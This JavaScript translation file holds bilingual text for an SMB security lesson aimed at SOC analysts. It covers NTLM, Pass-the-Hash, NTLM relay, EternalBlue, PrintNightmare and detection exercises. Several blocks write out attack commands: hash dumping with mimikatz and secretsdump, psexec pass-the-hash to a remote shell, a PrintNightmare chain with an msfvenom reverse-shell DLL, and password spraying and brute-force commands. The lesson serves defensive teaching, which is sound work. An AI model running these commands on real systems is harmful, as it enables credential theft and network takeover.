/* ============================================================
   i18n-smb.js — Traducciones EN del modulo SMB
   Protocolos Red SOC · @xavimape
   ============================================================
   Requiere que i18n-core.js este cargado antes (usa i18n.register).
   ============================================================ */

'use strict';

i18n.register({
    'smb.subtitle': { es: 'Server Message Block · TCP/445 · Compartición de archivos en red', en: 'Server Message Block · TCP/445 · Network File Sharing' },
    'smb.demo.waiting':          { es: 'Selecciona una demo y pulsa el botón...', en: 'Select a demo and press the button...' },
    'smb.demo.btn.session':      { es: '▶ Sesión SMB', en: '▶ SMB Session' },
    'smb.demo.btn.pth':          { es: '▶ Pass-the-Hash', en: '▶ Pass-the-Hash' },
    'smb.demo.btn.relay':        { es: '▶ SMB Relay', en: '▶ SMB Relay' },
    'smb.demo.session.title':    { es: '📂 Demo: Sesión SMB', en: '📂 Demo: SMB Session' },
    'smb.demo.session.server':   { es: 'Servidor SMB:', en: 'SMB Server:' },
    'smb.demo.session.share': "Share:",
    'smb.demo.session.ver': "SMB Version:",
    'smb.demo.session.client':   { es: 'Cliente:', en: 'Client:' },
    'smb.demo.session.output':   { es: 'Sesión SMB:', en: 'SMB Session:' },
    'smb.demo.pth.title':        { es: '🔑 Demo: Pass-the-Hash', en: '🔑 Demo: Pass-the-Hash' },
    'smb.demo.pth.target':       { es: 'Objetivo:', en: 'Target:' },
    'smb.demo.pth.user':         { es: 'Usuario:', en: 'Username:' },
    'smb.demo.pth.hash':         { es: 'Hash NTLM:', en: 'NTLM Hash:' },
    'smb.demo.pth.panel':        { es: 'Ataque PTH:', en: 'PTH Attack:' },
    'smb.demo.pth.result':       { es: 'Resultado:', en: 'Result:' },
    'smb.demo.pth.desc':         { es: 'En Windows, el hash NTLM puede usarse directamente para autenticarse sin conocer la contraseña en texto claro.', en: 'In Windows, the NTLM hash can be used directly to authenticate without knowing the plaintext password.' },
    'smb.demo.relay.title':      { es: '🔄 Demo: SMB Relay (NTLM Relay)', en: '🔄 Demo: SMB Relay (NTLM Relay)' },
    'smb.demo.relay.victim':     { es: 'Víctima:', en: 'Victim:' },
    'smb.demo.relay.attacker':   { es: 'Atacante (relay):', en: 'Attacker (relay):' },
    'smb.demo.relay.target':     { es: 'Objetivo final:', en: 'Final target:' },
    'smb.demo.relay.panel':      { es: 'Relay en progreso:', en: 'Relay in progress:' },
    'smb.demo.relay.result':     { es: 'Acceso obtenido:', en: 'Access obtained:' },
    'smb.demo.relay.desc':       { es: 'NTLM Relay intercepta la autenticación NTLM de una víctima y la redirige a otro servidor, obteniendo acceso sin conocer la contraseña.', en: 'NTLM Relay intercepts NTLM authentication from a victim and redirects it to another server, gaining access without knowing the password.' },
    'smb.s1.title': "What is SMB?",
    'smb.s1.sub':         { es: 'El protocolo de compartición de archivos de Windows — y su historia de vulnerabilidades', en: 'The Windows file sharing protocol — and its history of vulnerabilities' },
    'smb.s1.p1':          { es: 'TCP/445 — SMB directo (Windows 2000+)', en: 'TCP/445 — Direct SMB (Windows 2000+)' },
    'smb.s1.p2':          { es: 'TCP/139 — SMB sobre NetBIOS (legacy)', en: 'TCP/139 — SMB over NetBIOS (legacy)' },
    'smb.s1.p3':          { es: 'SMBv1 (1983) — protocolo original, NO cifrado, VULNERABLE (EternalBlue)', en: 'SMBv1 (1983) — original protocol, NOT encrypted, VULNERABLE (EternalBlue)' },
    'smb.s1.p4':          { es: 'SMBv2 (2006, Vista) — más eficiente, signing opcional', en: 'SMBv2 (2006, Vista) — more efficient, optional signing' },
    'smb.s1.p5':          { es: 'SMBv3 (2012, Win8) — cifrado AES-128, signing obligatorio posible', en: 'SMBv3 (2012, Win8) — AES-128 encryption, mandatory signing possible' },
    'smb.s1.p6':          { es: 'SMBv3.1.1 (2015, Win10) — pre-auth integrity, cifrado AES-256', en: 'SMBv3.1.1 (2015, Win10) — pre-auth integrity, AES-256 encryption' },
    'smb.s1.ports.title': "Ports and versions:",
    'smb.s2.title': "NTLM Authentication — Challenge/Response",
    'smb.s2.sub':     { es: 'El mecanismo de autenticación que hace posibles PTH y Relay', en: 'The authentication mechanism that enables PTH and Relay attacks' },
    'smb.s2.callout': { es: 'El hash NTLM NO es la contraseña, pero funciona como si lo fuera en la autenticación NTLM. Conocer el hash = acceso completo (Pass-the-Hash). El hash puede capturarse de memoria RAM, de la red, o de archivos SAM/NTDS.', en: 'The NTLM hash is NOT the password, but works as one in NTLM authentication. Knowing the hash = full access (Pass-the-Hash). The hash can be captured from RAM, the network, or SAM/NTDS files.' },
    'smb.s3.title': "Attack 1: Pass-the-Hash",
    'smb.s3.sub':   { es: 'Autenticarse con el hash NTLM sin conocer la contraseña', en: 'Authenticating with the NTLM hash without knowing the password' },
    'smb.s3.p1':    { es: 'NTLM autentica con el hash de la contraseña, no con la contraseña en sí. Un atacante que obtiene el hash (desde memoria, SAM, o NTDS.dit) puede usarlo directamente para autenticarse en cualquier servicio que use NTLM.', en: 'NTLM authenticates with the password hash, not the password itself. An attacker who obtains the hash (from memory, SAM, or NTDS.dit) can use it directly to authenticate to any NTLM service.' },
    'smb.s4.title': "Attack 2: SMB Relay (NTLM Relay)",
    'smb.s4.sub':   { es: 'Interceptar y reenviar autenticaciones NTLM a otros servidores', en: 'Intercepting and forwarding NTLM authentications to other servers' },
    'smb.s5.title': "Attack 3: EternalBlue (MS17-010)",
    'smb.s5.sub':   { es: 'La vulnerabilidad SMBv1 que propagó WannaCry y NotPetya', en: 'The SMBv1 vulnerability that spread WannaCry and NotPetya' },
    'smb.s5.p1':    { es: 'EternalBlue es un exploit de ejecución remota de código (RCE) sin autenticación contra SMBv1. Fue desarrollado por la NSA, filtrado por Shadow Brokers en abril 2017, y usado masivamente por WannaCry (mayo 2017) y NotPetya (junio 2017).', en: 'EternalBlue is an unauthenticated remote code execution (RCE) exploit against SMBv1. Developed by the NSA, leaked by Shadow Brokers in April 2017, and massively used by WannaCry (May 2017) and NotPetya (June 2017).' },
    'smb.s5.stats': { es: 'WannaCry: +200.000 sistemas en 150 países en 24h · $4B en daños estimados', en: 'WannaCry: +200,000 systems in 150 countries in 24h · $4B in estimated damages' },
    'smb.s6.title': "Administrative Shares",
    'smb.s6.sub':   { es: 'C$, ADMIN$, IPC$ — acceso oculto que los atacantes buscan', en: 'C$, ADMIN$, IPC$ — hidden access that attackers seek' },
    'smb.s7.title': "SMB in SOC Telemetry",
    'smb.s7.sub':   { es: 'Zeek smb.log + eventos Windows 4624/4625/5140/5145', en: 'Zeek smb.log + Windows events 4624/4625/5140/5145' },
    'smb.s8.title': "Detection and Mitigation",
    'smb.s8.sub':   { es: 'Checklist SOC para SMB — lo que debe tener configurado todo entorno Windows', en: 'SOC Checklist for SMB — what every Windows environment should have configured' },
    'smb.s8.m1': "Disable SMBv1",
    'smb.s8.m2': "Mandatory SMB Signing",
    'smb.s8.m3': "Disable LLMNR and NBT-NS",
    'smb.s8.m4': "Protected Users group",
    'smb.s8.m5': "Credential Guard",
    'smb.s8.m6': "Segmentation",
    'smb.s8.m7': "Alert on mass Event 4625 + C$ access",
    'smb.ej1.title': { es: 'Ejercicio 1: Identificar Pass-the-Hash', en: 'Exercise 1: Identify Pass-the-Hash' },
    'smb.ej1.q':     { es: 'En los logs de Windows Security, identifica si el siguiente evento 4624 es un login normal o un Pass-the-Hash. ¿Qué campo(s) lo delatan?', en: 'In Windows Security logs, identify whether the following Event 4624 is a normal login or a Pass-the-Hash. Which field(s) give it away?' },
    'smb.ej2.title': { es: 'Ejercicio 2: Detectar NTLM Relay', en: 'Exercise 2: Detect NTLM Relay' },
    'smb.ej2.q':     { es: 'Analiza el tráfico de Zeek smb.log. ¿Hay evidencia de un ataque Relay? ¿Qué IPs están involucradas y cuál es el flujo del ataque?', en: 'Analyze Zeek smb.log traffic. Is there evidence of a Relay attack? What IPs are involved and what is the attack flow?' },
    'smb.ej3.title': { es: 'Ejercicio 3: Evaluar Exposición EternalBlue', en: 'Exercise 3: Assess EternalBlue Exposure' },
    'smb.ej3.q':     { es: 'Dado el output de nmap, determina qué sistemas son vulnerables a MS17-010 y prioriza el orden de parcheo según criticidad del sistema.', en: 'Given the nmap output, determine which systems are vulnerable to MS17-010 and prioritize the patching order by system criticality.' },
    'smb.ej4.title': { es: 'Ejercicio 4: Analizar Acceso a Shares Administrativos', en: 'Exercise 4: Analyze Administrative Share Access' },
    'smb.ej4.q':     { es: 'El evento 5140 muestra acceso a ADMIN$ desde una cuenta de usuario estándar a las 3:00 AM. ¿Qué posibles escenarios de ataque considerarías? ¿Qué investigarías primero?', en: 'Event 5140 shows access to ADMIN$ from a standard user account at 3:00 AM. What possible attack scenarios would you consider? What would you investigate first?' },
    'smb.ej5.title': { es: 'Ejercicio 5: Regla de Detección SIEM', en: 'Exercise 5: SIEM Detection Rule' },
    'smb.ej5.q':     { es: 'Escribe una regla Sigma para detectar movimiento lateral via SMB: acceso a C$ o ADMIN$ desde una IP que no tiene historial de acceder a ese recurso, fuera del horario de mantenimiento.', en: 'Write a Sigma rule to detect lateral movement via SMB: access to C$ or ADMIN$ from an IP with no history of accessing that resource, outside maintenance windows.' },
    'smb.ej6.title': "Detect EternalBlue and PrintNightmare from the SIEM",
    'smb.ej6.q': "Your SIEM shows these correlated events. Identify which attack each one represents, the associated CVE, and what immediate action you would take as an L1 analyst.",
    'smb.s5.li1': "🏥 WannaCry (May 2017): 230,000+ systems in 150 countries. NHS paralyzed.",
    'smb.s5.li2': "💰 NotPetya (June 2017): $10B+ in damages. Maersk, Merck, FedEx.",
    'smb.s5.li3': "📦 Requires: Windows XP/7/2003/2008 with SMBv1 enabled and TCP/445 reachable",
    'smb.rec.cme': "CrackMapExec — SMB auditing",
    'smb.rec.responder': "Responder — poisoning tool",
    'smb.rec.cve1': "Unauthenticated RCE via SMBv1. Used by WannaCry and NotPetya. CVSS 9.3.",
    'smb.rec.cve2': "RCE / LPE via Windows Print Spooler. Escalation to SYSTEM from an unprivileged user.",
    'smb.rec.cve3': "Netlogon authentication bypass → Domain Controller takeover. CVSS 10.0.",
    'smb.pre0': { es: `
Cliente (WORKSTATION)              Servidor (\\\\SERVER)
      │                                    │
      │──── SMB_COM_NEGOTIATE ────────────►│  "¿Qué versiones soportás?"
      │◄─── SMB_COM_NEGOTIATE_RESPONSE ─── │
      │                                    │
      │──── SESSION_SETUP_REQ ────────────►│  NTLMSSP_NEGOTIATE
      │◄─── SESSION_SETUP_RESP ─────────── │  Challenge = 8 bytes random
      │                                    │
      │──── SESSION_SETUP_REQ ────────────►│  NTLMSSP_AUTH
      │     Response = HMAC_MD5(NTHash, Challenge)
      │     Usuario=jperez  Dominio=CORP
      │◄─── SESSION_SETUP_RESP ─────────── │  STATUS_SUCCESS
      │                                    │
      └── TREE_CONNECT → acceso al share ──┘

PROBLEMA FUNDAMENTAL:
  NTHash = MD4(contraseña)  → el servidor verifica con el HASH
  → Si robás el hash, podés autenticarte SIN la contraseña real`, en: `
Client (WORKSTATION)               Server (\\\\SERVER)
      │                                    │
      │──── SMB_COM_NEGOTIATE ────────────►│  "Which versions do you support?"
      │◄─── SMB_COM_NEGOTIATE_RESPONSE ─── │
      │                                    │
      │──── SESSION_SETUP_REQ ────────────►│  NTLMSSP_NEGOTIATE
      │◄─── SESSION_SETUP_RESP ─────────── │  Challenge = 8 bytes random
      │                                    │
      │──── SESSION_SETUP_REQ ────────────►│  NTLMSSP_AUTH
      │     Response = HMAC_MD5(NTHash, Challenge)
      │     User=jperez  Domain=CORP
      │◄─── SESSION_SETUP_RESP ─────────── │  STATUS_SUCCESS
      │                                    │
      └── TREE_CONNECT → access to share ──┘

FUNDAMENTAL PROBLEM:
  NTHash = MD4(password)  → the server verifies with the HASH
  → If you steal the hash, you can authenticate WITHOUT the real password` },
    'smb.pre1': { es: `
OBTENCIÓN DEL HASH:
  mimikatz# sekurlsa::logonpasswords
  → NTLM: aad3b435b51404eeaad3b435b51404ee (admin local)

  secretsdump.py -just-dc CORP/admin@192.168.1.1
  → Extrae todos los hashes del DC

PASS-THE-HASH con impacket:
  smbclient.py -hashes :aad3b435b51404eeaad3b435b51404ee \\
    CORP/Administrator@192.168.1.10
  → Acceso completo al servidor como Administrator

  psexec.py -hashes :HASH CORP/Administrator@192.168.1.10 cmd.exe
  → Shell remota via SMB (¡sin contraseña!)

ALCANCE: cualquier servicio que use NTLM es vulnerable:
  SMB, RDP (NLA desactivado), WMI, MSSQL, HTTP/NTLM, LDAP`, en: `
OBTAINING THE HASH:
  mimikatz# sekurlsa::logonpasswords
  → NTLM: aad3b435b51404eeaad3b435b51404ee (local admin)

  secretsdump.py -just-dc CORP/admin@192.168.1.1
  → Extracts all hashes from the DC

PASS-THE-HASH with impacket:
  smbclient.py -hashes :aad3b435b51404eeaad3b435b51404ee \\
    CORP/Administrator@192.168.1.10
  → Full access to the server as Administrator

  psexec.py -hashes :HASH CORP/Administrator@192.168.1.10 cmd.exe
  → Remote shell via SMB (no password!)

SCOPE: any service that uses NTLM is vulnerable:
  SMB, RDP (NLA disabled), WMI, MSSQL, HTTP/NTLM, LDAP` },
    'smb.pre2': { es: `
     VÍCTIMA                  ATACANTE                   TARGET
  (192.168.1.50)           (Responder)               (192.168.1.10)
        │                       │                          │
        │─── LLMNR query ──────►│  "¿Quién es \\\\FS01?"    │
        │◄── "Soy yo (Soy FS01)"│  ← envenenamiento       │
        │                       │                          │
        │─── SMB NEGOTIATE ────►│                          │
        │                       │──── SMB NEGOTIATE ──────►│
        │                       │◄─── NEGOTIATE_RESP ──────│
        │◄── NEGOTIATE_RESP ────│                          │
        │                       │                          │
        │─── NTLMSSP_NEGOTIATE ►│                          │
        │                       │──── SESSION_SETUP ──────►│
        │                       │◄─── Challenge (8 bytes)──│
        │◄── Challenge ─────────│                          │
        │                       │                          │
        │─── NTLMSSP_AUTH ─────►│  NTHash(usuario+chal)   │
        │   (hash de víctima)   │──── NTLMSSP_AUTH ───────►│
        │                       │◄─── STATUS_SUCCESS ──────│  ← sesión abierta!
        │                       │                          │
        │              ntlmrelayx sobre TARGET:            │
        │              • secretsdump (todos los hashes)    │
        │              • net user hacker P@ss /add         │
        │              • net localgroup administrators...  │`, en: `
     VICTIM                   ATTACKER                   TARGET
  (192.168.1.50)           (Responder)               (192.168.1.10)
        │                       │                          │
        │─── LLMNR query ──────►│  "Who is \\\\FS01?"        │
        │◄── "That's me — FS01" │  ← poisoning             │
        │                       │                          │
        │─── SMB NEGOTIATE ────►│                          │
        │                       │──── SMB NEGOTIATE ──────►│
        │                       │◄─── NEGOTIATE_RESP ──────│
        │◄── NEGOTIATE_RESP ────│                          │
        │                       │                          │
        │─── NTLMSSP_NEGOTIATE ►│                          │
        │                       │──── SESSION_SETUP ──────►│
        │                       │◄─── Challenge (8 bytes)──│
        │◄── Challenge ─────────│                          │
        │                       │                          │
        │─── NTLMSSP_AUTH ─────►│  NTHash(user+chal)      │
        │   (victim's hash)     │──── NTLMSSP_AUTH ───────►│
        │                       │◄─── STATUS_SUCCESS ──────│  ← session open!
        │                       │                          │
        │              ntlmrelayx on TARGET:               │
        │              • secretsdump (all hashes)          │
        │              • net user hacker P@ss /add         │
        │              • net localgroup administrators...  │` },
    'smb.pre4': { es: `
SHARES ADMINISTRATIVOS por defecto en Windows:
  \\\\SERVER\\C$      → unidad C: completa (solo admins)
  \\\\SERVER\\D$      → unidad D: completa (solo admins)
  \\\\SERVER\\ADMIN$  → carpeta Windows (C:\\Windows)
  \\\\SERVER\\IPC$    → named pipes (autenticación, RPC)
  \\\\SERVER\\PRINT$  → drivers de impresoras

SHARES DE DOMINIO (DC):
  \\\\DC\\SYSVOL      → scripts de grupo, políticas GPO
  \\\\DC\\NETLOGON    → scripts de inicio de sesión

POR QUÉ LOS ATACANTES LOS BUSCAN:
  C$ y ADMIN$ → acceso completo al sistema de archivos
  IPC$        → primer target para enumeración (RPC, SAM)
  SYSVOL      → puede contener contraseñas en GPP (Group Policy Preferences)
                CVE-2014-1812: cpassword en XML descifrable por cualquier usuario

DETECCIÓN:
  Accesos a C$ o ADMIN$ desde hosts no administrativos = IOC crítico
  Zeek: smb_files.log + smb_cmd.log → filtrar por share=C$ o ADMIN$`, en: `
DEFAULT ADMINISTRATIVE SHARES on Windows:
  \\\\SERVER\\C$      → full C: drive (admins only)
  \\\\SERVER\\D$      → full D: drive (admins only)
  \\\\SERVER\\ADMIN$  → Windows folder (C:\\Windows)
  \\\\SERVER\\IPC$    → named pipes (authentication, RPC)
  \\\\SERVER\\PRINT$  → printer drivers

DOMAIN SHARES (DC):
  \\\\DC\\SYSVOL      → group scripts, GPO policies
  \\\\DC\\NETLOGON    → logon scripts

WHY ATTACKERS LOOK FOR THEM:
  C$ and ADMIN$ → full filesystem access
  IPC$          → first target for enumeration (RPC, SAM)
  SYSVOL        → may contain passwords in GPP (Group Policy Preferences)
                CVE-2014-1812: cpassword in XML decryptable by any user

DETECTION:
  Access to C$ or ADMIN$ from non-admin hosts = critical IOC
  Zeek: smb_files.log + smb_cmd.log → filter by share=C$ or ADMIN$` },
    'smb.pre5': { es: `
# Zeek smb_cmd.log — comandos SMB
ts        id.orig_h      id.resp_h    command       arg
10:00:01  192.168.1.50   192.168.1.10  TREE_CONNECT  \\\\SERVER\\C$
10:00:02  192.168.1.50   192.168.1.10  NT_CREATE     \\\\autoexec.bat
10:00:05  192.168.1.50   192.168.1.10  NT_CREATE     \\\\Windows\\System32\\cmd.exe

# IOC: acceso a C$ + escritura de ejecutable → movimiento lateral
→ ALERTA: lateral movement via SMB admin share

# Zeek smb_files.log — transferencias de archivos
path=\\\\SERVER\\C$\\Windows\\Temp\\payload.exe  action=SMB::FILE_WRITE
→ Carga de payload via SMB

# Windows Event Log 4625 — login fallido NTLM
Account Name=  jperez
Logon Type=  3 (network)
Failure Reason=  Unknown username or bad password
Source Network Address=  192.168.1.99
→ Si hay muchos 4625 seguidos de un 4624 = probable PtH

# Event 4648 — logon con credenciales explícitas
"A logon was attempted using explicit credentials"
Target Server Name=  192.168.1.10
Account Name=  administrator
→ PsExec / impacket / lateral movement`, en: `
# Zeek smb_cmd.log — SMB commands
ts        id.orig_h      id.resp_h    command       arg
10:00:01  192.168.1.50   192.168.1.10  TREE_CONNECT  \\\\SERVER\\C$
10:00:02  192.168.1.50   192.168.1.10  NT_CREATE     \\\\autoexec.bat
10:00:05  192.168.1.50   192.168.1.10  NT_CREATE     \\\\Windows\\System32\\cmd.exe

# IOC: access to C$ + writing an executable → lateral movement
→ ALERT: lateral movement via SMB admin share

# Zeek smb_files.log — file transfers
path=\\\\SERVER\\C$\\Windows\\Temp\\payload.exe  action=SMB::FILE_WRITE
→ Payload upload via SMB

# Windows Event Log 4625 — failed NTLM login
Account Name=  jperez
Logon Type=  3 (network)
Failure Reason=  Unknown username or bad password
Source Network Address=  192.168.1.99
→ Many 4625 followed by a 4624 = likely PtH

# Event 4648 — logon with explicit credentials
"A logon was attempted using explicit credentials"
Target Server Name=  192.168.1.10
Account Name=  administrator
→ PsExec / impacket / lateral movement` },
    'smb.pre6': { es: `
VECTORES:
  CVE-2021-1675:  RCE remoto vía SMB + RPC  (parche inicial incompleto)
  CVE-2021-34527: LPE local + RCE remoto    (parche oficial de Microsoft)

EXPLOIT (impacket + DLL maliciosa):
  1. Verificar si Spooler está activo:
     rpcdump.py @TARGET | grep -i spooler
     → [*] Protocol: [MS-RPRN]: Print System Remote Protocol

  2. Preparar DLL maliciosa:
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll > evil.dll
     python3 -m http.server 8080  # servir la DLL via SMB/HTTP

  3. Explotar PrintNightmare:
     python3 CVE-2021-1675.py 'DOMAIN/user:pass'@TARGET '\\\\attacker\\share\\evil.dll'
     → [*] Triggering PrintNightmare
     → [+] Printer Driver installed successfully

  4. Recibir shell SYSTEM:
     msf > handler -H 10.0.0.1 -P 4444 -p windows/x64/meterpreter/reverse_tcp
     [*] Meterpreter session opened
     meterpreter > getuid → Server username: NT AUTHORITY\\SYSTEM

VERSIONES AFECTADAS:
  Windows 7/8.1/10/11, Windows Server 2008 R2 → 2022 (sin parchear)

DETECCIÓN:
  Evento 316: AddPrinterDriverEx con nombre de driver sospechoso
  Evento 808: RpcAddPrinterDriver con path UNC externo (\\\\attacker\\...)
  Sysmon Event 7: Carga de DLL desde path de impresoras
  SIEM: alerta en c:\\windows\\system32\\spool\\drivers con escrituras externas`, en: `
VECTORS:
  CVE-2021-1675:  remote RCE via SMB + RPC  (incomplete initial patch)
  CVE-2021-34527: local LPE + remote RCE    (official Microsoft patch)

EXPLOIT (impacket + malicious DLL):
  1. Check whether Spooler is active:
     rpcdump.py @TARGET | grep -i spooler
     → [*] Protocol: [MS-RPRN]: Print System Remote Protocol

  2. Prepare the malicious DLL:
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll > evil.dll
     python3 -m http.server 8080  # serve the DLL via SMB/HTTP

  3. Exploit PrintNightmare:
     python3 CVE-2021-1675.py 'DOMAIN/user:pass'@TARGET '\\\\attacker\\share\\evil.dll'
     → [*] Triggering PrintNightmare
     → [+] Printer Driver installed successfully

  4. Receive a SYSTEM shell:
     msf > handler -H 10.0.0.1 -P 4444 -p windows/x64/meterpreter/reverse_tcp
     [*] Meterpreter session opened
     meterpreter > getuid → Server username: NT AUTHORITY\\SYSTEM

AFFECTED VERSIONS:
  Windows 7/8.1/10/11, Windows Server 2008 R2 → 2022 (unpatched)

DETECTION:
  Event 316: AddPrinterDriverEx with a suspicious driver name
  Event 808: RpcAddPrinterDriver with an external UNC path (\\\\attacker\\...)
  Sysmon Event 7: DLL load from the printers path
  SIEM: alert on c:\\windows\\system32\\spool\\drivers with external writes` },
    'smb.pre7': { es: `
TIPOS DE ATAQUE:

1. ENUMERACIÓN DE USUARIOS (sin credenciales):
   enum4linux -U TARGET     → lista usuarios via RPC
   crackmapexec smb TARGET --users  → enumerar cuentas del dominio
   impacket-lookupsid DOMAIN/user:pass@TARGET → SIDs → usuarios

2. PASSWORD SPRAYING (un password, muchos usuarios):
   Objetivo: evitar lockout (típicamente 5 intentos antes del bloqueo)
   crackmapexec smb TARGET -u users.txt -p "Password2024!" --continue-on-success
   Señal de éxito: "[+] DOMAIN\\user:Password2024! (Pwn3d!)"

3. CREDENTIAL STUFFING (listas filtradas):
   crackmapexec smb TARGET -u creds.txt -p creds.txt --no-bruteforce
   Usa pares usuario:contraseña de dumps (RockYou, etc.)

4. BRUTE FORCE CLÁSICO (pocas cuentas, muchas contraseñas):
   hydra -l Administrator -P rockyou.txt smb://TARGET
   Riesgo: lockout de cuentas si hay política de bloqueo activa

INDICADORES DE COMPROMISO:
  Event 4625: Logon failed (multiple en poco tiempo)
  Event 4771: Kerberos pre-auth failed
  Zeek: smb_auth.log, múltiples intentos con distintos users desde misma IP
  SIEM: >10 fallos de auth SMB por minuto desde una IP

DETECCIÓN AVANZADA:
  Account lockout threshold < 5 intentos
  MFA para cuentas privilegiadas
  Honeypot: cuenta "admin" con alertas en cualquier intento de login`, en: `
ATTACK TYPES:

1. USER ENUMERATION (no credentials):
   enum4linux -U TARGET     → lists users via RPC
   crackmapexec smb TARGET --users  → enumerate domain accounts
   impacket-lookupsid DOMAIN/user:pass@TARGET → SIDs → users

2. PASSWORD SPRAYING (one password, many users):
   Goal: avoid lockout (typically 5 attempts before lockout)
   crackmapexec smb TARGET -u users.txt -p "Password2024!" --continue-on-success
   Success signal: "[+] DOMAIN\\user:Password2024! (Pwn3d!)"

3. CREDENTIAL STUFFING (leaked lists):
   crackmapexec smb TARGET -u creds.txt -p creds.txt --no-bruteforce
   Uses user:password pairs from dumps (RockYou, etc.)

4. CLASSIC BRUTE FORCE (few accounts, many passwords):
   hydra -l Administrator -P rockyou.txt smb://TARGET
   Risk: account lockout if a lockout policy is active

INDICATORS OF COMPROMISE:
  Event 4625: Logon failed (multiple in a short time)
  Event 4771: Kerberos pre-auth failed
  Zeek: smb_auth.log, multiple attempts with different users from the same IP
  SIEM: >10 SMB auth failures per minute from one IP

ADVANCED DETECTION:
  Account lockout threshold < 5 attempts
  MFA for privileged accounts
  Honeypot: "admin" account with alerts on any login attempt` },
    'smb.pre8': { es: `
# Windows Event Log (DC — 192.168.1.1):
4625: Account=jperez  LogonType=3  SourceIP=192.168.1.99  (×3 en 1s)
4624: Account=jperez  LogonType=3  SourceIP=192.168.1.99  AuthPkg=NTLM

# Zeek smb_cmd.log:
10:15:00  src=192.168.1.99  dst=192.168.1.1  cmd=TREE_CONNECT  \\\\DC\\IPC$
10:15:01  src=192.168.1.99  dst=192.168.1.1  cmd=TREE_CONNECT  \\\\DC\\C$
10:15:02  src=192.168.1.99  dst=192.168.1.1  cmd=NT_CREATE     \\\\PSEXESVC.exe

# Zeek smb_files.log:
10:15:02  src=192.168.1.99  path=\\\\DC\\ADMIN$\\PSEXESVC.exe  action=FILE_WRITE  size=179KB

# Después:
10:15:05  proceso: PSEXESVC.exe creado en DC como SYSTEM
10:15:06  proceso: cmd.exe lanzado por PSEXESVC → whoami → "nt authority\\system"`, en: `
# Windows Event Log (DC — 192.168.1.1):
4625: Account=jperez  LogonType=3  SourceIP=192.168.1.99  (×3 in 1s)
4624: Account=jperez  LogonType=3  SourceIP=192.168.1.99  AuthPkg=NTLM

# Zeek smb_cmd.log:
10:15:00  src=192.168.1.99  dst=192.168.1.1  cmd=TREE_CONNECT  \\\\DC\\IPC$
10:15:01  src=192.168.1.99  dst=192.168.1.1  cmd=TREE_CONNECT  \\\\DC\\C$
10:15:02  src=192.168.1.99  dst=192.168.1.1  cmd=NT_CREATE     \\\\PSEXESVC.exe

# Zeek smb_files.log:
10:15:02  src=192.168.1.99  path=\\\\DC\\ADMIN$\\PSEXESVC.exe  action=FILE_WRITE  size=179KB

# Afterwards:
10:15:05  process: PSEXESVC.exe created on the DC as SYSTEM
10:15:06  process: cmd.exe launched by PSEXESVC → whoami → "nt authority\\system"` },
    'smb.pre10': { es: `
EVENTO A — Suricata IDS alert (03:14:22):
  alert: ET EXPLOIT Possible EternalBlue MS17-010 Echo Response
  src: 10.0.5.88:445  →  dst: 10.0.5.92
  proto: SMB  |  sid: 2024792  |  severity: HIGH
  additional: [SMBv1 Trans2 SESSION_SETUP]

EVENTO B — Windows Event Log en PRINT-SERVER-01 (03:14:45):
  EventID: 808   (Print Spooler — carga de driver)
  UserName: low_priv_user
  DriverName: "Microsoft XPS Document Writer v4"
  EventID: 4688  (Process Creation)
  NewProcessName: C:\\Windows\\System32\\spoolsv.exe
  CommandLine: spoolsv.exe → [SYSTEM shell spawned]

EVENTO C — Zeek conn.log (03:14:20):
  10.0.5.88  →  10.0.5.92  TCP/445  duration: 0.003s  state: S0
  10.0.5.88  →  10.0.5.93  TCP/445  duration: 0.003s  state: S0
  10.0.5.88  →  10.0.5.94  TCP/445  duration: 0.003s  state: S0
  [... 24 hosts más en 4 segundos, mismo patrón]`, en: `
EVENT A — Suricata IDS alert (03:14:22):
  alert: ET EXPLOIT Possible EternalBlue MS17-010 Echo Response
  src: 10.0.5.88:445  →  dst: 10.0.5.92
  proto: SMB  |  sid: 2024792  |  severity: HIGH
  additional: [SMBv1 Trans2 SESSION_SETUP]

EVENT B — Windows Event Log on PRINT-SERVER-01 (03:14:45):
  EventID: 808   (Print Spooler — driver load)
  UserName: low_priv_user
  DriverName: "Microsoft XPS Document Writer v4"
  EventID: 4688  (Process Creation)
  NewProcessName: C:\\Windows\\System32\\spoolsv.exe
  CommandLine: spoolsv.exe → [SYSTEM shell spawned]

EVENT C — Zeek conn.log (03:14:20):
  10.0.5.88  →  10.0.5.92  TCP/445  duration: 0.003s  state: S0
  10.0.5.88  →  10.0.5.93  TCP/445  duration: 0.003s  state: S0
  10.0.5.88  →  10.0.5.94  TCP/445  duration: 0.003s  state: S0
  [... 24 more hosts in 4 seconds, same pattern]` },
    'smb.pre11': { es: `
Zeek smb_cmd.log (07:00 - 09:15):
  07:03:00  src=192.168.1.55  dst=192.168.1.10  TREE_CONNECT  \\\\FS01\\C$
  07:03:01  src=192.168.1.55  dst=192.168.1.12  TREE_CONNECT  \\\\WS12\\C$
  07:03:02  src=192.168.1.55  dst=192.168.1.18  TREE_CONNECT  \\\\WS18\\C$
  07:03:05  src=192.168.1.55  múltiples NT_CREATE + FILE_WRITE en C$\\Users\\*

Event 4624 (todos los destinos):
  Account=administrator  LogonType=3  AuthPkg=NTLM  SourceIP=192.168.1.55

nmap previo (06:50):
  Zeek conn.log: 192.168.1.55 escaneó 192.168.1.0/24 TCP/445 — SF en 23 hosts`, en: `
Zeek smb_cmd.log (07:00 - 09:15):
  07:03:00  src=192.168.1.55  dst=192.168.1.10  TREE_CONNECT  \\\\FS01\\C$
  07:03:01  src=192.168.1.55  dst=192.168.1.12  TREE_CONNECT  \\\\WS12\\C$
  07:03:02  src=192.168.1.55  dst=192.168.1.18  TREE_CONNECT  \\\\WS18\\C$
  07:03:05  src=192.168.1.55  multiple NT_CREATE + FILE_WRITE in C$\\Users\\*

Event 4624 (all destinations):
  Account=administrator  LogonType=3  AuthPkg=NTLM  SourceIP=192.168.1.55

prior nmap (06:50):
  Zeek conn.log: 192.168.1.55 scanned 192.168.1.0/24 TCP/445 — SF on 23 hosts` },
    'smb.opt1': "SMBv3 (Windows 8+, encrypted)",
    'smb.opt2': "Windows 7 SP1 (unpatched)",
    'smb.opt3': "Windows 7 SP1 (with MS17-010)",
    'smb.opt4': "Remote RCE (CVE-2021-1675)",
    'smb.opt5': "Local LPE (CVE-2021-34527)",
    'smb.opt6': "Patched system",
    'smb.opt7': "User enumeration",
    'smb.challenge.title': { es: 'Desafío Final: Investigación de Incidente SMB', en: 'Final Challenge: SMB Incident Investigation' },
